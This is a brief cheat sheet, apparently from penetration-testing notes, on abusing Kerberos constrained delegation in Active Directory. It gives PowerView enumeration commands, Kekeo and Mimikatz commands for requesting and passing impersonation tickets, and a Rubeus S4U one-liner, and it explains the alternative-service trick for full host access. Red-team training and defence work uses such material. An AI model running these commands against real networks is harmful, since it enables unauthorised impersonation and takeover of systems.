# Using PowerView and Kekeo
- Enumerate Users and Computers with constrained delegation:
```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```
- If we have a user that has Constrained Delegation, we ask for a valid TGT of this user using Kekeo:
```powershell
tgt::ask /user:<UserName> /domain:<Domain's FQDN> /rc4:<hashedPasswordOfTheUser>
```
- Then using the TGT we have, ask a TGS for a service this user has access to through constrained delegation:
```powershell
tgs::s4u /tgt:<PathToTGT> /user:<UserToImpersonate>@<Domain's FQDN> /service:<Service's SPN>
```
- Finally use `mimikatz` to pass-the-ticket the TGS:
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt <PathToTGS>"'
```

---

# Using Rubeus
- Alternatively, use Rubeus:
```powershell
Rubeus.exe s4u /user:<UserName> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<UserToImpersonate> /msdsspn:"<Service's SPN>" /altservice:<Optional> /ptt
```
- Now we can access the service as the impersonated user!

---

**NOTE:** What if we have delegation rights for only a specific SPN? (e.g TIME):

- In this case we can still abuse a feature of Kerberos called "alternative service". 
- This allows us to request TGS tickets for other "alternative" services and not only for the one we have rights for. 
- That gives us the leverage to request valid tickets for any service we want that the host supports, giving us full access over the target machine.